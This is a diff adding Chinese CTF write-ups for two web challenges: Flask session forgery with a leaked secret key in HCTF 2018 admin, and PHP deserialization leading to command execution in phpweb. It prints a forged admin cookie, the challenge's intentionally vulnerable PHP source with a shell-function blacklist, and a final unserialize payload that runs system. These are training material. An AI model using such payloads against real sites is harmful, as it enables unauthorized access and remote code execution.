@@ -2830,7 +2830,151 @@ with open('maps.txt', 'r') as maps:
                     f.write(mem_data)
 ```
 
+## BUUOJ [HCTF 2018]admin
 
+### 1. 分析
+
+这题主要考的也是Flask session伪造，进入站点注册账号，在`/index`可以看到提示
+
+![image-20231118222810726](CTF.assets/image-20231118222810726.png)
+
+在`/change`也有一个提示
+
+<img src="CTF.assets/image-20231118222846383.png" alt="image-20231118222846383" style="zoom:50%;" />
+
+他这里的GitHub网址已经访问不了了，因为这里包含着这个网站的源码，如果访问不了就没法做，只能看人家的WP了
+
+在`config.py`里面带有`SECRET_KEY`
+
+![在这里插入图片描述](CTF.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTY0MjYxMA==,size_16,color_FFFFFF,t_70.png)
+
+在`index.html`里面有着返回flag的条件
+
+![在这里插入图片描述](CTF.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTY0MjYxMA==,size_16,color_FFFFFF,t_70-17003178622923.png)
+
+### 2. 复现
+
+知道了`SECRET_KEY`就可以伪造Session了，将原来的cookie做解密得到：
+
+`{'_fresh': True, '_id': b'7be77543f7fdd4412dc2bc1d9ae48d46b5af748eaf447a41d456c58a0281e6162f406b1b8a3f4fc528d327229117a39f2c331718c6e06229090558c5a8eabf27', 'csrf_token': b'512005a06dc2271f47a99391e9cc02e759062f10', 'image': b'j01X', 'name': 'test', 'user_id': '10'}`
+
+![image-20231118223221319](CTF.assets/image-20231118223221319.png)
+
+在`index.html`中可以看到，只要session中的`name`值为`admin`就返回flag！所以把用户改为`admin`即可
+
+```bash
+┌──(kali㉿kali)-[~/ctfTool/web/flask-session-cookie-manager]
+└─$ python flask_session_cookie_manager3.py encode -s 'ckj123' -t "{'_fresh': True, '_id': b'7be77543f7fdd4412dc2bc1d9ae48d46b5af748eaf447a41d456c58a0281e6162f406b1b8a3f4fc528d327229117a39f2c331718c6e06229090558c5a8eabf27', 'csrf_token': b'512005a06dc2271f47a99391e9cc02e759062f10', 'image': b'j01X', 'name': 'admin', 'user_id': '10'}" 
+.eJxFkEGLwjAQhf_KMmcPtq4XwUMgVrYwU7qklORSurXaJo0LVTGN-N83lWX3NPDem48384DqOLaXDjbX8dYuoOoPsHnA2xdsgOJ0IN9ExMlSrIzi-RJFaqRPe-kTk5XJQLwzxFVPZWLJ5-9qnjxfSZG7kI_IYpTtd3fUJ6eEdKTT4LNY6qQPulf600pfTNk-96ibCbVxKA4d-sGiRY9-t0LRabLFnfTHlAm2Rl4EJkZSdIMsUxv2tvBcQHMZj9X127Tn_xPEbkLOQpTFao8B3zil53pmjd6ESoOWnk1KNFFAx2ilQ7Z94Xpbn9o_Uq2ZK3-dc23bWTrY_gwLuF3a8fU3iJbw_AFHom6X.ZVjHzw.mSXkO4n622QtjDNolUC2WE7gVm4
+```
+
+最后重放一下：`flag{ac18cd89-3e59-4fa2-8c2c-37ce873b8a0d}`
+
+![image-20231118223436538](CTF.assets/image-20231118223436538.png)
+
+## BUUOJ [网鼎杯 2020 朱雀组]phpweb
+
+> 这题也不难，就是脑袋没转过来，很多东西没想到
+
+进去看到一个报错，然后就没了，抓包看看（不要难得抓包，求求了），很清楚的看到：`func`为函数名，`p`为参数，后面一定也有一个回调函数
+
+![image-20231118235333178](CTF.assets/image-20231118235333178.png)
+
+这里一开始是想用`system eval`之类的函数直接执行的，结果又被过滤了，然后想再用一个回调函数来调用`system`函数，但是可恶只有一个传参`p`可以传入
+
+使用`highlight_file`函数把源码读取出
+
+把思路打开，有一个`Test`类，也可以调用函数，那么就可以利用这个`Test`类来做反序列化
+
+```php
+<!DOCTYPE html>
+<html>
+<head>
+    <title>phpweb</title>
+    <style type="text/css">
+        body {
+            background: url("bg.jpg") no-repeat;
+            background-size: 100%;
+        }
+        p {
+            color: white;
+        }
+    </style>
+</head>
+
+<body>
+<script language=javascript>
+    setTimeout("document.form1.submit()",5000)
+</script>
+<p>
+    <?php
+    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
+    function gettime($func, $p) {
+        $result = call_user_func($func, $p);
+        $a= gettype($result);
+        if ($a == "string") {
+            return $result;
+        } else {return "";}
+    }
+
+
+    class Test {
+        var $p = "Y-m-d h:i:s a";
+        var $func = "date";
+        function __destruct() {
+            if ($this->func != "") {
+                echo gettime($this->func, $this->p);
+            }
+        }
+    }
+    $func = $_REQUEST["func"];
+    $p = $_REQUEST["p"];
+
+	# 只要 func 不为空且不再黑名单内就能执行。
+    if ($func != null) {
+        $func = strtolower($func);
+        if (!in_array($func,$disable_fun)) {
+            echo gettime($func, $p);
+        }else {
+            die("Hacker...");
+        }
+    }
+    ?>
+</p>
+<form  id=form1 name=form1 action="index.php" method=post>
+    <input type=hidden id=func name=func value='date'>
+    <input type=hidden id=p name=p value='Y-m-d h:i:s a'>
+</body>
+</html>
+```
+
+**反序列化脚本**
+
+```php
+<?php
+
+class Test
+{
+    var $p = "ls /";
+    var $func = "system";
+
+    function __destruct()
+    {
+        if ($this->func != "") {
+            echo gettime($this->func, $this->p);
+        }
+    }
+}
+
+
+
+$t = new Test();
+echo serialize($t);
+```
+
+最后flag在`/tmp/flagoefiu4r93`：`flag{9ebf9a02-7328-470d-9609-8d42f97ec7da}`
+
+payload：`func=unserialize&p=O:4:"Test":2:{s:1:"p";s:22:"cat+/tmp/flagoefiu4r93";s:4:"func";s:6:"system";}`
 
 # Misc
 
